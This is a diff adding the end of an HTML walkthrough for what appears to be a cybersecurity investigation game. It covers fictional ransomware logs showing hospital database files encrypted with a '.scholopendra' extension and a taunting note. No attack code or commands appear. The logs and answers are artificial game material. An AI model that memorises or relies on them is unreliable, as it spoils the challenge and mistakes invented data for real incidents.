+                    <td>2024-04-02 11:33:16.0000</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                    <td>ccbaab672fd2a8412d61f0a82838633052544e6bf5996ed9c5bbf503665de6b8</td>
+                    <td>C:\System\Database\medical_inventories.db.scholopendra</td>
+                    <td>medical_inventories.db.scholopendra</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:33:17.0000</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                    <td>6c9e68ecce293439118058f371c3f42b1b8b755553eada70e010a206ca6f5a8a</td>
+                    <td>C:\System\Database\patient_records.db.scholopendra</td>
+                    <td>patient_records.db.scholopendra</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:36:30.0000</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                    <td>4f31fbaf3f3c5f3c5d5338154769ccfe74530e30bb5f307a02bdef59d98dc507</td>
+                    <td>C:\In\ItWentWrong.jpg</td>
+                    <td>ItWentWrong.jpg</td>
+                    <td>firefox.exe</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:37:54.0000</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                    <td>80116ec6ed1f703b11bf20f46523115ee1ed8a297f9104569e7b206f81d69d51</td>
+                    <td>C:\Users\rotrenneman\Desktop\WhatCouldPossiblyGoWrong.txt</td>
+                    <td>WhatCouldPossiblyGoWrong.txt</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Not shown in the table above (which is an excerpt of the full results), but the Batch script encrypted all of Roy Trenemman's files (such as miscellaneous documents, images, etc.) and, since his device doubled as the hospital's ERP server, the databases themselves. Further, it's shown when the threat actor downloaded the mocking ransom wallpaper (which was set as the desktop wallpaper across all devices) and a ransom note (or otherwise a taunt) named <samp>WhatCouldPossiblyGoWrong.txt</samp>, likely referencing an article of that nature that the threat actors read during their recon.</p>
+          <p>The files were encrypted and appended with the <samp>.scholopendra</samp> file extension.</p>
+        </section> <!--section 4-->
+        <section id="section5"><!--section 5-->
+          <h3>Section 5 - Bonus: Mo' Money Mo' Problems</h3>
+          <p>Breaking kayfabe for a bit, but this section of the game corresponds to various trivia questions (such as who hosts what cybersecurity podcast) and some slight CTF-like puzzles (such as deobfuscating strings that use a variety of cipher algorithms, such as ROT13, or encoding algorithms such as base64). It is thus omitted; but I do recommend tools such as <a href="https://gchq.github.io/CyberChef/">CyberChef</a> and <a href="https://www.dcode.fr/en">dCode.fr</a> for these.</p>
+        </section> <!--section 5-->
+      </article> <!--game sections-->
+      <a class="skip" href="#page-navigation">Return to page navigation</a>
+    </main><!--main page content-->
+  </body>
+</html>
